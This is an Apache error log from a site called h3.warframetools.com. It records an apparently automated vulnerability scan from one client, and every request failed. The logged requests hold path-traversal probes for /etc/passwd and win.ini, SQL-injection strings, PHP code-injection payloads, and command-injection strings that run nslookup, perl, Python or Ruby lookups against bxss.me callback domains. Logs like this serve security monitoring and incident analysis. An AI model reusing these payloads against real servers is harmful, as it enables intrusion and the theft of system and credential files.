[Wed Jul 07 19:33:43.221544 2021] [core:error] [pid 15971] [client 27.147.202.214:2210] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:33:43.338765 2021] [core:error] [pid 15658] [client 27.147.202.214:2199] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:33:43.807996 2021] [core:error] [pid 15630] [client 27.147.202.214:2204] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:44.178369 2021] [php7:error] [pid 15776] [client 27.147.202.214:13226] script '/var/www/html/h3.warframetools.com/discordbotE3usu.php' not found or unable to stat
[Wed Jul 07 19:33:44.503223 2021] [core:error] [pid 15634] [client 27.147.202.214:2202] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:44.673651 2021] [core:error] [pid 15110] [client 27.147.202.214:2209] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:44.924719 2021] [php7:error] [pid 15473] [client 27.147.202.214:2120] script '/var/www/html/h3.warframetools.com/indexMaWhC.php' not found or unable to stat
[Wed Jul 07 19:33:45.089234 2021] [core:error] [pid 15777] [client 27.147.202.214:2208] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:33:45.091130 2021] [negotiation:error] [pid 15774] [client 27.147.202.214:2201] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/h3.warframetools.com/discordbot (None could be negotiated).
[Wed Jul 07 19:33:45.207056 2021] [core:error] [pid 15120] [client 27.147.202.214:2219] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:33:45.343993 2021] [core:error] [pid 15473] [client 27.147.202.214:2120] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:45.535669 2021] [core:error] [pid 15646] [client 27.147.202.214:2127] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:33:45.580274 2021] [php7:error] [pid 15735] [client 27.147.202.214:9888] script '/var/www/html/h3.warframetools.com/Ez4ltindex.php' not found or unable to stat
[Wed Jul 07 19:33:45.752358 2021] [core:error] [pid 15113] [client 27.147.202.214:2122] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:46.436327 2021] [php7:error] [pid 15776] [client 27.147.202.214:13226] script '/var/www/html/h3.warframetools.com/IzC2Wdiscordbot.php' not found or unable to stat
[Wed Jul 07 19:33:46.826533 2021] [core:error] [pid 15471] [client 27.147.202.214:2195] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:33:46.831584 2021] [core:error] [pid 15469] [client 27.147.202.214:1975] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:46.848118 2021] [core:error] [pid 15673] [client 27.147.202.214:2000] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:33:47.149569 2021] [core:error] [pid 15976] [client 27.147.202.214:1994] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:33:47.261060 2021] [core:error] [pid 14364] [client 27.147.202.214:2206] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:47.463229 2021] [core:error] [pid 14857] [client 27.147.202.214:1947] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:33:47.874023 2021] [php7:error] [pid 15774] [client 27.147.202.214:2201] script '/var/www/html/h3.warframetools.com/bak.index.php' not found or unable to stat
[Wed Jul 07 19:33:48.493999 2021] [core:error] [pid 15450] [client 27.147.202.214:10200] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:33:48.725472 2021] [core:error] [pid 15256] [client 27.147.202.214:2196] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:49.048557 2021] [core:error] [pid 15979] [client 27.147.202.214:2007] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:33:49.304607 2021] [core:error] [pid 15112] [client 27.147.202.214:2193] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:33:49.441537 2021] [negotiation:error] [pid 15973] [client 27.147.202.214:13742] AH00687: Negotiation: discovered file(s) matching request: /var/www/html/h3.warframetools.com/index (None could be negotiated).
[Wed Jul 07 19:33:49.713498 2021] [core:error] [pid 15308] [client 27.147.202.214:13732] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:50.478521 2021] [php7:error] [pid 15774] [client 27.147.202.214:2201] script '/var/www/html/h3.warframetools.com/old.index.php' not found or unable to stat
[Wed Jul 07 19:33:50.649782 2021] [core:error] [pid 15971] [client 27.147.202.214:8096] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:33:50.911577 2021] [core:error] [pid 15450] (36)File name too long: [client 27.147.202.214:6021] AH00036: access to /css/;(nslookup hitwtuahtstwpa3324.bxss.me||perl -e "gethostbyname('hitwtuahtstwpa3324.bxss.me')")|(nslookup hitwtuahtstwpa3324.bxss.me||perl -e "gethostbyname('hitwtuahtstwpa3324.bxss.me')")&(nslookup hitwtuahtstwpa3324.bxss.me||perl -e "gethostbyname('hitwtuahtstwpa3324.bxss.me')").css failed (filesystem path '/var/www/html/h3.warframetools.com/css/;(nslookup hitwtuahtstwpa3324.bxss.me||perl -e "gethostbyname('hitwtuahtstwpa3324.bxss.me')")|(nslookup hitwtuahtstwpa3324.bxss.me||perl -e "gethostbyname('hitwtuahtstwpa3324.bxss.me')")&(nslookup hitwtuahtstwpa3324.bxss.me||perl -e "gethostbyname('hitwtuahtstwpa3324.bxss.me')").css')
[Wed Jul 07 19:33:50.977903 2021] [core:error] [pid 15735] [client 27.147.202.214:9888] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:33:51.607783 2021] [php7:error] [pid 15776] [client 27.147.202.214:13226] script '/var/www/html/h3.warframetools.com/old_discordbot.php' not found or unable to stat
[Wed Jul 07 19:33:51.920751 2021] [php7:error] [pid 15776] [client 27.147.202.214:13226] script '/var/www/html/h3.warframetools.com/discordbot_old.php' not found or unable to stat
[Wed Jul 07 19:33:52.229756 2021] [php7:error] [pid 15776] [client 27.147.202.214:13226] script '/var/www/html/h3.warframetools.com/discordbot_bak.php' not found or unable to stat
[Wed Jul 07 19:33:52.416014 2021] [core:error] [pid 14364] [client 27.147.202.214:12781] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:52.523102 2021] [core:error] [pid 15471] [client 27.147.202.214:14512] AH00126: Invalid URI in request GET /js/../../../Gemfile HTTP/1.1
[Wed Jul 07 19:33:52.599380 2021] [php7:error] [pid 15985] [client 27.147.202.214:8116] script '/var/www/html/h3.warframetools.com/response.write(9788339*9686400).php' not found or unable to stat
[Wed Jul 07 19:33:52.937649 2021] [php7:error] [pid 15985] [client 27.147.202.214:8116] script '/var/www/html/h3.warframetools.com/'+response.write(9788339*9686400)+'.php' not found or unable to stat
[Wed Jul 07 19:33:53.271340 2021] [php7:error] [pid 15985] [client 27.147.202.214:8116] script '/var/www/html/h3.warframetools.com/"+response.write(9788339*9686400)+".php' not found or unable to stat
[Wed Jul 07 19:33:53.578195 2021] [core:error] [pid 15974] [client 27.147.202.214:8098] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:33:53.595207 2021] [core:error] [pid 15774] [client 27.147.202.214:2201] AH00126: Invalid URI in request GET /css//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:53.603811 2021] [php7:error] [pid 15985] [client 27.147.202.214:8116] script '/var/www/html/h3.warframetools.com/WJWr1Stv.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:53.649614 2021] [php7:error] [pid 15456] [client 27.147.202.214:14303] script '/var/www/html/h3.warframetools.com/echo fweaxp$()\\ vsyrcj\\nz^xyu||a #' &echo fweaxp$()\\ vsyrcj\\nz^xyu||a #|" &echo fweaxp$()\\ vsyrcj\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 19:33:53.856433 2021] [core:error] [pid 14331] [client 27.147.202.214:2216] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:33:53.880271 2021] [core:error] [pid 15645] [client 27.147.202.214:8725] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml? HTTP/1.1
[Wed Jul 07 19:33:53.928674 2021] [core:error] [pid 15308] [client 27.147.202.214:4201] AH00126: Invalid URI in request GET /js/../../../web.config HTTP/1.1
[Wed Jul 07 19:33:54.233931 2021] [core:error] [pid 14857] [client 27.147.202.214:6022] AH00126: Invalid URI in request GET /css//........................................................................../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:33:54.405299 2021] [php7:error] [pid 15456] [client 27.147.202.214:14303] script '/var/www/html/h3.warframetools.com/&echo ujwogk$()\\ uzeyaq\\nz^xyu||a #' &echo ujwogk$()\\ uzeyaq\\nz^xyu||a #|" &echo ujwogk$()\\ uzeyaq\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 19:33:54.490558 2021] [core:error] [pid 15473] [client 27.147.202.214:10191] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:54.500406 2021] [authz_core:error] [pid 15299] [client 27.147.202.214:4892] AH01630: client denied by server configuration: /var/www/html/h3.warframetools.com/.php, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:54.741966 2021] [php7:error] [pid 15456] [client 27.147.202.214:14303] script '/var/www/html/h3.warframetools.com/|echo kvctvv$()\\ mphqob\\nz^xyu||a #' |echo kvctvv$()\\ mphqob\\nz^xyu||a #|" |echo kvctvv$()\\ mphqob\\nz^xyu||a #.php' not found or unable to stat
[Wed Jul 07 19:33:54.909901 2021] [core:error] [pid 15633] [client 27.147.202.214:5895] AH00126: Invalid URI in request GET /js/../../../package.json HTTP/1.1
[Wed Jul 07 19:33:55.659715 2021] [php7:error] [pid 15658] [client 27.147.202.214:12822] script '/var/www/html/h3.warframetools.com/discordbot&n915670=v902947.php' not found or unable to stat
[Wed Jul 07 19:33:55.742257 2021] [core:error] [pid 15776] [client 27.147.202.214:13226] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:33:55.995847 2021] [php7:error] [pid 15658] [client 27.147.202.214:12822] script '/var/www/html/h3.warframetools.com/).php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:56.025491 2021] [php7:error] [pid 15456] [client 27.147.202.214:14303] script '/var/www/html/h3.warframetools.com/(nslookup hitnsszndrxrra16ac.bxss.me||perl -e "gethostbyname('hitnsszndrxrra16ac.bxss.me')").php' not found or unable to stat
[Wed Jul 07 19:33:56.292616 2021] [php7:error] [pid 15645] [client 27.147.202.214:5959] script '/var/www/html/h3.warframetools.com/UnhXNThwRWxQQQ==.php' not found or unable to stat
[Wed Jul 07 19:33:56.318962 2021] [php7:error] [pid 15658] [client 27.147.202.214:12822] script '/var/www/html/h3.warframetools.com/!(()&&!|*|*|.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:56.442378 2021] [php7:error] [pid 15456] [client 27.147.202.214:14303] script '/var/www/html/h3.warframetools.com/bxss.me.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:56.444436 2021] [core:error] [pid 15971] [client 27.147.202.214:5904] AH00126: Invalid URI in request GET /css//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:56.538528 2021] [core:error] [pid 15452] [client 27.147.202.214:14520] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:33:56.605860 2021] [php7:error] [pid 15985] [client 27.147.202.214:8116] script '/var/www/html/h3.warframetools.com/'.gethostbyname(lc('hitxm'.'kqcmydchc386e.bxss.me.')).'A'.chr(67).chr(hex('58')).chr(120).chr(77).chr(106).chr(83).'.php' not found or unable to stat
[Wed Jul 07 19:33:56.612564 2021] [php7:error] [pid 15645] [client 27.147.202.214:5959] script '/var/www/html/h3.warframetools.com/;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));.php' not found or unable to stat
[Wed Jul 07 19:33:56.641299 2021] [core:error] [pid 15471] [client 27.147.202.214:5898] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:56.642716 2021] [php7:error] [pid 15120] [client 27.147.202.214:8106] script '/var/www/html/h3.warframetools.com/str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitvdbsdriiacd2e6c.'+'bxss.me').php' not found or unable to stat
[Wed Jul 07 19:33:56.644051 2021] [php7:error] [pid 15658] [client 27.147.202.214:12822] script '/var/www/html/h3.warframetools.com/^(#$!@#$)(()))******.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:56.650908 2021] [core:error] [pid 15979] [client 27.147.202.214:12817] AH00126: Invalid URI in request GET /css//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:56.746866 2021] [core:error] [pid 15787] [client 27.147.202.214:8800] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:33:56.829188 2021] [php7:error] [pid 14799] [client 27.147.202.214:2211] script '/var/www/html/h3.warframetools.com/1HJU4aJP.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:56.941978 2021] [php7:error] [pid 15645] [client 27.147.202.214:5959] script '/var/www/html/h3.warframetools.com/';print(md5(31337));$a='.php' not found or unable to stat
[Wed Jul 07 19:33:56.970572 2021] [php7:error] [pid 15120] [client 27.147.202.214:8106] script '/var/www/html/h3.warframetools.com/'+str(__import__("time").sleep(9))+__import__("socket").gethostbyname("hitvdbsdriiacd2e6c."+"bxss.me")+'.php' not found or unable to stat
[Wed Jul 07 19:33:56.979361 2021] [php7:error] [pid 15658] [client 27.147.202.214:12822] script '/var/www/html/h3.warframetools.com/"+"A".concat(70-3).concat(22*4).concat(110).concat(85).concat(122).concat(83)+(require"socket"\nSocket.gethostbyname("hitsc"+"cuyahkii89565.bxss.me.")[3].to_s)+".php' not found or unable to stat
[Wed Jul 07 19:33:57.251929 2021] [php7:error] [pid 15777] [client 27.147.202.214:8117] script '/var/www/html/h3.warframetools.com/".gethostbyname(lc("hitpb"."eeiqglnyf740b.bxss.me."))."A".chr(67).chr(hex("58")).chr(101).chr(74).chr(117).chr(86).".php' not found or unable to stat
[Wed Jul 07 19:33:57.270148 2021] [php7:error] [pid 15645] [client 27.147.202.214:5959] script '/var/www/html/h3.warframetools.com/";print(md5(31337));$a=".php' not found or unable to stat
[Wed Jul 07 19:33:57.301202 2021] [php7:error] [pid 15120] [client 27.147.202.214:8106] script '/var/www/html/h3.warframetools.com/"+str(__import__('time').sleep(9))+__import__('socket').gethostbyname('hitvdbsdriiacd2e6c.'+'bxss.me')+".php' not found or unable to stat
[Wed Jul 07 19:33:57.443931 2021] [php7:error] [pid 15456] [client 27.147.202.214:14303] script '/var/www/html/h3.warframetools.com/))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))))).php' not found or unable to stat
[Wed Jul 07 19:33:57.517792 2021] [core:error] [pid 15977] [client 27.147.202.214:4361] AH00126: Invalid URI in request GET /js//../../../WEB-INF/web.xml%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:33:57.633958 2021] [php7:error] [pid 15985] [client 27.147.202.214:8116] script '/var/www/html/h3.warframetools.com/'".php' not found or unable to stat
[Wed Jul 07 19:33:57.825385 2021] [php7:error] [pid 15671] [client 27.147.202.214:8865] script '/var/www/html/h3.warframetools.com/discordbot' AND 2*3*8=6*8 AND 'BO1a'='BO1a.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:57.924916 2021] [php7:error] [pid 15645] [client 27.147.202.214:5959] script '/var/www/html/h3.warframetools.com/1kqvEDc8O.php' not found or unable to stat
[Wed Jul 07 19:33:57.966373 2021] [php7:error] [pid 15985] [client 27.147.202.214:8116] script '/var/www/html/h3.warframetools.com/<!--.php' not found or unable to stat
[Wed Jul 07 19:33:58.155816 2021] [php7:error] [pid 15671] [client 27.147.202.214:8865] script '/var/www/html/h3.warframetools.com/discordbot" AND 2*3*8=6*8 AND "DDMA"="DDMA.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:58.377761 2021] [php7:error] [pid 15118] [client 27.147.202.214:8838] script '/var/www/html/h3.warframetools.com/$(nslookup hitactzivyecp5bbd4.bxss.me||perl -e "gethostbyname('hitactzivyecp5bbd4.bxss.me')").php' not found or unable to stat
[Wed Jul 07 19:33:58.571648 2021] [php7:error] [pid 15127] [client 27.147.202.214:5941] script '/var/www/html/h3.warframetools.com/discordbot9215268.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:58.575995 2021] [core:error] [pid 15473] [client 27.147.202.214:8846] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:33:58.896750 2021] [core:error] [pid 15118] [client 27.147.202.214:8838] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:33:58.908090 2021] [autoindex:error] [pid 15127] [client 27.147.202.214:5941] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:33:59.077470 2021] [core:error] [pid 15299] [client 27.147.202.214:4892] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:33:59.179386 2021] [php7:error] [pid 15979] [client 27.147.202.214:8931] script '/usr/share/apache2/icons/gtcgn8h324d3.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:33:59.335646 2021] [core:error] [pid 15446] [client 27.147.202.214:2194] AH00126: Invalid URI in request GET /css/../../Gemfile HTTP/1.1
[Wed Jul 07 19:33:59.400790 2021] [core:error] [pid 15985] [client 27.147.202.214:8116] AH00126: Invalid URI in request GET /js//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
[Wed Jul 07 19:33:59.611411 2021] [core:error] [pid 15455] [client 27.147.202.214:8934] AH00126: Invalid URI in request GET /icons/../../../../../../../../z/../../../../../../../../../etc/shells HTTP/1.1
[Wed Jul 07 19:33:59.633423 2021] [php7:error] [pid 15120] [client 27.147.202.214:8106] script '/var/www/html/h3.warframetools.com/'+'A'.concat(70-3).concat(22*4).concat(109).concat(73).concat(102).concat(74)+(require'socket'\nSocket.gethostbyname('hitkb'+'odtlqrobc3279.bxss.me.')[3].to_s)+'.php' not found or unable to stat
[Wed Jul 07 19:33:59.666392 2021] [core:error] [pid 15976] [client 27.147.202.214:8943] AH00126: Invalid URI in request GET /css/../../web.config HTTP/1.1
[Wed Jul 07 19:33:59.946518 2021] [core:error] [pid 15473] [client 27.147.202.214:10897] AH00126: Invalid URI in request GET /js/../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:00.334080 2021] [php7:error] [pid 15671] [client 27.147.202.214:8865] script '/var/www/html/h3.warframetools.com/discordbot%' AND 2*3*8=6*8 AND 'BmlT'!='BmlT%.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:00.685941 2021] [php7:error] [pid 15671] [client 27.147.202.214:8865] script '/var/www/html/h3.warframetools.com/-1 OR 2+430-430-1=0+0+0+1.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:00.686952 2021] [core:error] [pid 15297] [client 27.147.202.214:5919] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:00.719093 2021] [autoindex:error] [pid 15783] [client 27.147.202.214:8942] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:34:00.882638 2021] [core:error] [pid 14331] [client 27.147.202.214:5948] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:00.910136 2021] [php7:error] [pid 15127] [client 27.147.202.214:5941] script '/var/www/html/h3.warframetools.com/&(nslookup hithxottcafdu49620.bxss.me||perl -e "gethostbyname('hithxottcafdu49620.bxss.me')")&'\\"`0&(nslookup hithxottcafdu49620.bxss.me||perl -e "gethostbyname('hithxottcafdu49620.bxss.me')")&`'.php' not found or unable to stat
[Wed Jul 07 19:34:01.007241 2021] [core:error] [pid 15671] [client 27.147.202.214:8865] AH00126: Invalid URI in request GET /js/../../web.config HTTP/1.1
[Wed Jul 07 19:34:01.050251 2021] [autoindex:error] [pid 15308] [client 27.147.202.214:8932] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:34:01.249304 2021] [core:error] [pid 15314] [client 27.147.202.214:10894] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:01.265189 2021] [autoindex:error] [pid 15112] [client 27.147.202.214:12787] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:34:01.339985 2021] [core:error] [pid 15977] [client 27.147.202.214:8946] AH00126: Invalid URI in request GET /js/../../package.json HTTP/1.1
[Wed Jul 07 19:34:01.535960 2021] [autoindex:error] [pid 14415] [client 27.147.202.214:8929] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:01.559386 2021] [php7:error] [pid 15471] [client 27.147.202.214:8922] script '/var/www/html/h3.warframetools.com/|(nslookup hitdcshsgffpz0eeba.bxss.me||perl -e "gethostbyname('hitdcshsgffpz0eeba.bxss.me')").php' not found or unable to stat
[Wed Jul 07 19:34:01.604269 2021] [core:error] [pid 15456] [client 27.147.202.214:14303] AH00126: Invalid URI in request GET /js/../../../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:01.626821 2021] [autoindex:error] [pid 15644] [client 27.147.202.214:8909] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:34:01.683383 2021] [core:error] [pid 15127] [client 27.147.202.214:5941] AH00126: Invalid URI in request GET /js/../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:01.684462 2021] [php7:error] [pid 15640] [client 27.147.202.214:7042] script '/var/www/html/h3.warframetools.com/-1 OR 3+430-430-1=0+0+0+1.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:01.727987 2021] [autoindex:error] [pid 15308] [client 27.147.202.214:8932] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:34:01.770908 2021] [autoindex:error] [pid 15645] [client 27.147.202.214:10892] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive
[Wed Jul 07 19:34:01.809823 2021] [core:error] [pid 14359] [client 27.147.202.214:8859] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:01.928613 2021] [autoindex:error] [pid 15112] [client 27.147.202.214:12787] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:01.935330 2021] [core:error] [pid 15450] [client 27.147.202.214:6021] AH00126: Invalid URI in request GET /js/../../../../web.config HTTP/1.1
[Wed Jul 07 19:34:01.953910 2021] [autoindex:error] [pid 15644] [client 27.147.202.214:8909] AH01276: Cannot serve directory /usr/share/apache2/icons/: No matching DirectoryIndex (index.html,index.cgi,index.pl,index.php,index.xhtml,index.htm) found, and server-generated directory index forbidden by Options directive, referer: https://h3.warframetools.com/css/main.css
[Wed Jul 07 19:34:02.021982 2021] [php7:error] [pid 15777] [client 27.147.202.214:8117] script '/var/www/html/h3.warframetools.com/discordbot'||'.php' not found or unable to stat, referer: https://h3.warframetools.com/
[Wed Jul 07 19:34:02.204699 2021] [php7:error] [pid 15452] [client 27.147.202.214:8902] script '/var/www/html/h3.warframetools.com/`(nslookup hitdujkitpmvpec4e1.bxss.me||perl -e "gethostbyname('hitdujkitpmvpec4e1.bxss.me')")`.php' not found or unable to stat
[Wed Jul 07 19:34:02.273929 2021] [core:error] [pid 15787] [client 27.147.202.214:8933] AH00126: Invalid URI in request GET /js/../../../../package.json HTTP/1.1
[Wed Jul 07 19:34:02.327559 2021] [core:error] [pid 15979] [client 27.147.202.214:8931] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
[Wed Jul 07 19:34:02.455725 2021] [core:error] [pid 15308] [client 27.147.202.214:8932] AH00126: Invalid URI in request GET /js//../../../../../../../../etc/passwd%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:02.501055 2021] [php7:error] [pid 15645] [client 27.147.202.214:10892] script '/var/www/html/h3.warframetools.com/images/apc.php' not found or unable to stat
[Wed Jul 07 19:34:02.501102 2021] [core:error] [pid 15646] [client 27.147.202.214:8950] AH00126: Invalid URI in request GET /js//../../../../../../../../windows/win.ini%C0%80.jsp HTTP/1.1
[Wed Jul 07 19:34:02.601105 2021] [core:error] [pid 15644] [client 27.147.202.214:8909] AH00126: Invalid URI in request GET /js/../../../../package-lock.json HTTP/1.1
[Wed Jul 07 19:34:02.634668 2021] [core:error] [pid 15142] [client 27.147.202.214:8947] AH00126: Invalid URI in request GET /js/../../Gemfile HTTP/1.1
[Wed Jul 07 19:34:02.636860 2021] [core:error] [pid 15111] [client 27.147.202.214:6976] AH00126: Invalid URI in request GET /css/../../package.json HTTP/1.1
[Wed Jul 07 19:34:02.670598 2021] [core:error] [pid 15696] [client 27.147.202.214:8944] AH00126: Invalid URI in request GET /css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../windows/win.ini HTTP/1.1
